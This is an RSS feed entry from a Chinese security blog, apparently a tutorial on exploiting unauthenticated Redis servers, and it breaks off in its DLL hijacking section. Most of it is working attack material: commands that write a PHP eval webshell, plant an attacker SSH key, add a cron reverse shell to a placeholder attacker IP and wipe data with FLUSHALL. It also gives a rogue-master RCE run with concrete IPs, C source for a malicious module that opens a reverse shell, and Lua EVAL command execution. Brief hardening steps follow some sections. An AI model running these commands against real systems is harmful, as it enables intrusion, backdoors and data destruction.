<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Redis on baozongwi's blog</title><link>https://baozongwi.xyz/tags/redis/</link><description>Recent content in Redis on baozongwi's blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>baozongwi</copyright><lastBuildDate>Mon, 22 Sep 2025 20:24:20 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/tags/redis/index.xml" rel="self" type="application/rss+xml"/><item><title>Redis未授权利用</title><link>https://baozongwi.xyz/p/redis-unauthorized-access-exploit/</link><pubDate>Mon, 22 Sep 2025 20:24:20 +0800</pubDate><guid>https://baozongwi.xyz/p/redis-unauthorized-access-exploit/</guid><description>&lt;p>redis未授权利用，确认其是否存活&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">redis-cli -h &amp;lt;Target-IP&amp;gt; -p &amp;lt;Target-Port&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">info
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>可以说是最火热的姿势了，经常用到，这里我介绍几种我知道的&lt;/p>
&lt;h2 id="写入文件其他">写入文件&amp;amp;&amp;amp;其他
&lt;/h2>&lt;p>这里分很多种，得知web根目录写入webshell，写入ssh密钥，写入定时任务反弹shell，还有获取（清空）数据&lt;/p>
&lt;h3 id="写入webshell">写入webshell
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">CONFIG SET dir /var/www/html
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET dbfilename shell.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SET payload &lt;span class="s2">&amp;#34;&amp;lt;?php @eval(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="s2">[&amp;#39;cmd&amp;#39;]);?&amp;gt;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SAVE
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="写入ssh密钥">写入ssh密钥
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">CONFIG SET dir /home/root/.ssh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET dbfilename authorized_keys
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SET payload &lt;span class="s2">&amp;#34;ssh-rsa AAAAB3NzaC1yc2E...攻击者公钥&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SAVE
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="写入定时任务">写入定时任务
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">CONFIG SET dir /var/spool/cron
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET dbfilename root
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 写入定时任务（每分钟反弹Shell）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SET payload &lt;span class="s2">&amp;#34;* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/攻击者IP/端口 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SAVE
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="获取清空数据">获取（清空）数据
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 删库&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FLUSHALL
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 查看键值&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">KEYS *
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">GET &amp;lt;key&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="修复">修复
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># linux&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 降权运行Redis&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">useradd -r redis &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> chown -R redis:redis /var/lib/redis
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 配置文件限制&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET dir /var/lib/redis
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET dbfilename dump.rdb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 禁用高危命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command FLUSHALL &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command CONFIG &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command SAVE &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># windows&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 创建专用低权限用户&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net user redisuser &lt;span class="s2">&amp;#34;P@ssw0rd&amp;#34;&lt;/span> /add /expires:never
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">icacls &lt;span class="s2">&amp;#34;C:\Program Files\Redis&amp;#34;&lt;/span> /grant redisuser:&lt;span class="o">(&lt;/span>OI&lt;span class="o">)(&lt;/span>CI&lt;span class="o">)&lt;/span>F
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="主从复制rce">主从复制RCE
&lt;/h2>&lt;p>只要未授权访问+未禁用&lt;code>SLAVEOF&lt;/code>&lt;/p>
&lt;ul>
&lt;li>Redis 主从复制时，&lt;strong>主节点（Master）&lt;/strong> 会将自己的数据（包括RDB文件）同步到 &lt;strong>从节点（Slave）&lt;/strong> 。&lt;/li>
&lt;li>攻击者可以伪造一个 &lt;strong>恶意主节点&lt;/strong> ，强制目标 Redis（作为从节点）同步恶意数据（如&lt;code>.so&lt;/code>文件、SSH密钥、WebShell等）。&lt;/li>
&lt;/ul>
&lt;p>也有可以一键利用的工具 &lt;a class="link" href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener"
>https://github.com/n0b0dyCN/redis-rogue-server&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 编译工具&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> RedisModulesSDK/exp/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 使用&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 redis-rogue-server.py --rhost 39.98.116.123 --lhost 160.30.231.213
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">r
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">160.30.231.213
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">9999&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">9999&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 获取交互shell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">script /dev/null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>修复，直接禁用主从复制命令，以及限制只读权限&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 彻底禁用主从复制命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command SLAVEOF &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 或限制为只读从节点（仍需密码）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">replica-read-only yes
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="加载恶意模块rce">加载恶意模块RCE
&lt;/h2>&lt;p>Redis 4.0+（（支持动态模块加载的版本）并且需攻击者能上传恶意&lt;code>.so&lt;/code>文件）&lt;/p>
&lt;p>这个打法和主从复制很类似，都是加载恶意so等模块进行利用。&lt;/p>
&lt;p>创建恶意模块，注册可以反弹shell的恶意方法，再注册&lt;code>EVILCMD&lt;/code>命令可触发恶意&lt;code>EvilCommand&lt;/code>方法&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;#34;redismodule.h&amp;#34;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">EvilCommand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">RedisModuleCtx&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RedisModuleString&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/攻击者IP/端口 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 反弹Shell
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="n">REDISMODULE_OK&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">RedisModule_OnLoad&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">RedisModuleCtx&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">ctx&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">RedisModule_CreateCommand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;EVILCMD&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">EvilCommand&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;readonly&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">REDISMODULE_OK&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//gcc -shared -fPIC -o evilmodule.so evilmodule.c $(pkg-config --cflags --libs hiredis)
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>传入目标服务器之后进行加载（局限性还挺大）&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">MODULE LOAD /tmp/evilmodule.so
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">EVILCMD
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>当然也有现成的项目供我们使用 &lt;a class="link" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" target="_blank" rel="noopener"
>https://github.com/n0b0dyCN/RedisModules-ExecuteCommand&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> RedisModules-ExecuteCommand &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> make
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 想办法传上去&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MODULE LOAD /tmp/exp.so
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">system.exec &lt;span class="s2">&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/攻击者IP/端口 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>修复，禁用模块加载，以及重命名模块命令&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 禁用模块系统&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET enable-module-command no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 或重命名模块命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command MODULE &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="使用lua脚本rce">&lt;strong>使用Lua脚本RCE&lt;/strong>
&lt;/h2>&lt;ul>
&lt;li>Redis &amp;lt; 7.4.2&lt;/li>
&lt;li>Redis &amp;lt; 7.2.7&lt;/li>
&lt;li>Redis &amp;lt; 6.2.17&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">EVAL &lt;span class="s2">&amp;#34;os.execute(&amp;#39;cmd.exe /C your_command_here&amp;#39;)&amp;#34;&lt;/span> &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>修复，暂时禁用EVAL还有就是升级版本&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 升级到安全版本：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Redis &amp;gt;= 7.4.2 / &amp;gt;= 7.2.7 / &amp;gt;= 6.2.17&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 临时缓解（禁用EVAL）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command EVAL &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="redis命令重命名滥用">&lt;strong>Redis命令重命名滥用&lt;/strong>
&lt;/h2>&lt;p>只要未禁用&lt;code>CONFIG&lt;/code>命令&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">CONFIG GET rename-command
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>如果返回为空说明未做限制，这里以禁用FLUSHALL为例子&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command FLUSHALL &lt;span class="s2">&amp;#34;disabled_flushall&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>我们可以重新命名config&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command CONFIG &lt;span class="s2">&amp;#34;newconfig&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">newconfig SET requirepass &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 恢复默认名&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">newconfig SET rename-command FLUSHALL &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FLUSHALL
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="dll劫持">DLL劫持
&lt;/h2>&lt;p>上面说的那几点，都是针对于Linux的redis未授权服务，但是如果是windows的话，就不能那么来进行getshell了，这里使用到一个常见姿势，DLL劫持，通常而言windows适应的默认版本都是受影响的范围，这里以3.0.504为demo进行测试 &lt;strong>Redis for Windows&lt;/strong> &lt;strong>3.0.504及以下&lt;/strong>&lt;/p>
&lt;p>&lt;a class="link" href="https://www.cnblogs.com/sup3rman/p/16803408.html" target="_blank" rel="noopener"
